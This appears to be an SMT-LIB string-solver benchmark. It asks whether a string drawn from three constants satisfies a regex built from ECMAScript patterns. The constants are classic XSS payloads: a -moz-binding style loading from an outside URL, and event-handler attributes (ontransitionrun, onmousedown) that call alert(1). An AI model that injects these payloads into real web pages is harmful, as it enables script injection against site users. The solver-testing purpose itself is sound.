; lang_ops, BMP mode: x from a disjunction of constants, (negated) membership of x in a regex built by language operations from ECMAScript regexes
(set-logic QF_SLIA)
(set-info :status sat)
(declare-const x String)
(assert (or (= x "<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmo\u{1f600}z.xml#xss"")}</STYLE>") (= x "<style>:target {transform: rotate(180deg);}</style><keygen id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></keygen>") (= x "<mark onmousedown=""alert(1)"">test</mark>")))
(assert (str.in_re x (re.union (re.union ((_ re.from_regex ecma2020) "(?=.*[a-zA-Z]).{4,}") (re.++ re.all (str.to_re ">"))) (re.comp ((_ re.from_regex ecma2020) "[A-Za-z]{4,25}")))))
(check-sat)
